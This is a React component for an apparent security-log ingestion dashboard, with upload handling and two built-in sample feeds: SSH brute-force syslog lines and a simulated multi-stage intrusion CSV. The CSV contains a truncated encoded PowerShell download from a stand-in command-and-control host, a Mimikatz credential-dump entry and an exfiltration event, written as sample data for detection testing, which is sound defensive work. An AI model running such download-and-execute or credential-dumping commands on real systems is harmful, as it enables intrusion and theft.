import React, { useState, useRef } from 'react';
import { Upload, FileText, CheckCircle2, AlertCircle, Sparkles, HardDrive } from 'lucide-react';
import Spinner from './Spinner';
import { logsApi } from '../services/api';

export default function LogUploader({ onUploadSuccess }) {
  const [isDragging, setIsDragging] = useState(false);
  const [file, setFile] = useState(null);
  const [saveLogFile, setSaveLogFile] = useState(true);
  const [isUploading, setIsUploading] = useState(false);
  const [error, setError] = useState(null);
  const [summary, setSummary] = useState(null);
  const fileInputRef = useRef(null);

  const handleDragOver = (e) => {
    e.preventDefault();
    setIsDragging(true);
  };

  const handleDragLeave = () => {
    setIsDragging(false);
  };

  const handleDrop = (e) => {
    e.preventDefault();
    setIsDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      setFile(e.dataTransfer.files[0]);
      setError(null);
    }
  };

  const handleFileSelect = (e) => {
    if (e.target.files && e.target.files.length > 0) {
      setFile(e.target.files[0]);
      setError(null);
    }
  };

  const handleUpload = async () => {
    if (!file) return;

    setIsUploading(true);
    setError(null);
    setSummary(null);

    const formData = new FormData();
    formData.append('file', file);
    formData.append('saveFile', saveLogFile ? 'true' : 'false');

    try {
      const res = await logsApi.upload(formData);
      setSummary(res.data.summary);
      setFile(null);
      if (onUploadSuccess) onUploadSuccess(res.data.summary);
    } catch (err) {
      setError(err.response?.data?.message || 'Failed to parse and ingest log file');
    } finally {
      setIsUploading(false);
    }
  };

  const handleLoadSample = async (sampleType) => {
    setIsUploading(true);
    setError(null);
    setSummary(null);

    let sampleContent = '';
    let fileName = '';

    if (sampleType === 'syslog') {
      fileName = 'sshd_auth.log';
      sampleContent = `Sep 17 12:01:02 bastion sshd[4102]: Failed password for invalid user admin from 194.26.29.112 port 49120 ssh2
Sep 17 12:01:08 bastion sshd[4105]: Failed password for invalid user admin from 194.26.29.112 port 49122 ssh2
Sep 17 12:01:14 bastion sshd[4108]: Failed password for invalid user admin from 194.26.29.112 port 49124 ssh2
Sep 17 12:01:21 bastion sshd[4110]: Failed password for invalid user root from 194.26.29.112 port 49126 ssh2
Sep 17 12:01:29 bastion sshd[4114]: Failed password for invalid user root from 194.26.29.112 port 49128 ssh2
Sep 17 12:01:45 bastion sshd[4120]: Accepted password for jsmith from 194.26.29.112 port 49130 ssh2`;
    } else {
      fileName = 'windows_intrusion.csv';
      sampleContent = `timestamp,source,host,username,sourceIP,destinationIP,sourcePort,destinationPort,eventType,action,status,severity,techniqueId,description
2026-09-17T06:00:00Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51001,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:00:15Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51002,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:00:30Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51003,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:00:45Z,windows,WS01-FIN,admin,194.26.29.112,10.0.0.45,51004,445,authentication,login,failed,high,T1110,EventID 4625: Logon failure for user admin from 194.26.29.112
2026-09-17T06:01:00Z,windows,WS01-FIN,jsmith,194.26.29.112,10.0.0.45,51005,445,authentication,login,success,critical,T1078,EventID 4624: Successful logon for jsmith from 194.26.29.112
2026-09-17T06:02:10Z,edr,WS01-FIN,jsmith,10.0.0.45,185.220.101.5,52010,443,process,execute,success,critical,T1059.001,powershell.exe -Enc JABj... -Uri http://evil-c2-tunnel.ru/stage2.bin
2026-09-17T06:05:00Z,edr,WS01-FIN,SYSTEM,10.0.0.45,,0,0,process,execute,success,critical,T1003,Mimikatz LSASS credential dump (Hash: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f)
2026-09-17T06:10:00Z,windows,DC01-ROOT,svc_backup,10.0.0.45,10.0.0.1,58921,3389,network,connect,success,critical,T1021.001,Remote Desktop session established from WS01-FIN to DC01-ROOT
2026-09-17T06:15:00Z,network,DC01-ROOT,svc_backup,10.0.0.1,185.220.101.5,61200,443,network,connect,success,critical,T1041,Outbound data burst to evil-c2-tunnel.ru (185.220.101.5)`;
    }

    try {
      const blob = new Blob([sampleContent], { type: 'text/plain' });
      const sampleFile = new File([blob], fileName, { type: 'text/plain' });
      const formData = new FormData();
      formData.append('file', sampleFile);
      formData.append('saveFile', saveLogFile ? 'true' : 'false');

      const res = await logsApi.upload(formData);
      setSummary(res.data.summary);
      if (onUploadSuccess) onUploadSuccess(res.data.summary);
    } catch (err) {
      setError(err.response?.data?.message || 'Failed to ingest sample telemetry');
    } finally {
      setIsUploading(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Drag & Drop Card */}
      <div
        onDragOver={handleDragOver}
        onDragLeave={handleDragLeave}
        onDrop={handleDrop}
        className={`p-8 border-2 border-dashed rounded-2xl text-center transition-all ${
          isDragging
            ? 'border-cyan-400 bg-cyan-500/10'
            : 'border-slate-800 bg-[#0f1422] hover:border-slate-700'
        }`}
      >
        <input
          ref={fileInputRef}
          type="file"
          accept=".csv,.json,.txt,.log"
          onChange={handleFileSelect}
          className="hidden"
        />

        <div className="mx-auto w-14 h-14 rounded-2xl bg-cyan-500/10 text-cyan-400 flex items-center justify-center mb-4">
          <Upload className="w-7 h-7" />
        </div>

        <h4 className="text-base font-bold font-mono text-slate-100">
          Drag & Drop Security Log File
        </h4>
        <p className="text-xs text-slate-400 mt-1 max-w-md mx-auto">
          Supported formats: <strong className="text-slate-300">.CSV, .JSON, .TXT, .LOG</strong> (Windows Event Logs, Linux Syslog, EDR, Firewall dumps up to 25MB).
        </p>

        <div className="mt-5 flex items-center justify-center gap-3">
          <button
            type="button"
            onClick={() => fileInputRef.current?.click()}
            className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono font-medium transition-colors"
          >
            Browse Files...
          </button>

          {file && (
            <button
              type="button"
              onClick={handleUpload}
              disabled={isUploading}
              className="flex items-center gap-2 px-5 py-2 rounded-lg bg-gradient-to-r from-cyan-500 to-blue-600 text-black text-xs font-bold font-mono hover:brightness-110 shadow-[0_0_12px_rgba(6,182,212,0.3)] disabled:opacity-50 transition-all"
            >
              {isUploading ? <Spinner size="sm" /> : <Upload className="w-4 h-4" />}
              {isUploading ? 'Normalizing...' : 'Upload & Parse'}
            </button>
          )}
        </div>

        {file && (
          <div className="mt-4 inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-[#0a0d14] border border-slate-800 text-xs font-mono text-cyan-400">
            <FileText className="w-4 h-4" />
            <span>{file.name} ({(file.size / 1024).toFixed(1)} KB)</span>
          </div>
        )}
      </div>

      {/* Preset Quick Ingestion Samples */}
      <div className="p-4 bg-[#0b0f19] border border-slate-800/80 rounded-xl flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <Sparkles className="w-4 h-4 text-cyan-400" />
          <span className="text-xs font-mono font-semibold text-slate-300">
            One-Click Sample Telemetry Feeds:
          </span>
        </div>

        <div className="flex items-center gap-2">
          <button
            type="button"
            disabled={isUploading}
            onClick={() => handleLoadSample('intrusion')}
            className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-cyan-300 text-xs font-mono transition-colors disabled:opacity-50"
          >
            + Load Multi-Stage APT Sample (CSV)
          </button>
          <button
            type="button"
            disabled={isUploading}
            onClick={() => handleLoadSample('syslog')}
            className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-amber-300 text-xs font-mono transition-colors disabled:opacity-50"
          >
            + Load SSH Brute-Force Sample (TXT)
          </button>
        </div>
      </div>

      {/* Error Message */}
      {error && (
        <div className="p-4 rounded-xl bg-rose-950/60 border border-rose-800 text-rose-300 flex items-center gap-3 text-sm">
          <AlertCircle className="w-5 h-5 flex-shrink-0 text-rose-400" />
          <span>{error}</span>
        </div>
      )}

      {/* Ingestion Parse Summary Card */}
      {summary && (
        <div className="p-5 rounded-xl bg-[#0f1422] border border-emerald-500/40 shadow-[0_0_15px_rgba(16,185,129,0.15)] space-y-3">
          <div className="flex items-center gap-2 text-emerald-400 font-mono font-bold text-sm">
            <CheckCircle2 className="w-5 h-5" />
            <span>Telemetry Pipeline Ingestion Completed!</span>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono">
            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">File Ingested</span>
              <strong className="text-slate-200 truncate block">{summary.fileName}</strong>
            </div>

            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">Normalized Events</span>
              <strong className="text-cyan-400 text-base">{summary.eventsInserted}</strong>
            </div>

            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">Extracted IOCs</span>
              <strong className="text-purple-400 text-base">{summary.iocsExtracted}</strong>
            </div>

            <div className="p-3 bg-[#0a0d14] rounded-lg border border-slate-800">
              <span className="text-slate-500 uppercase block mb-1">Generated Alerts</span>
              <strong className="text-rose-400 text-base">{summary.alertsGenerated}</strong>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
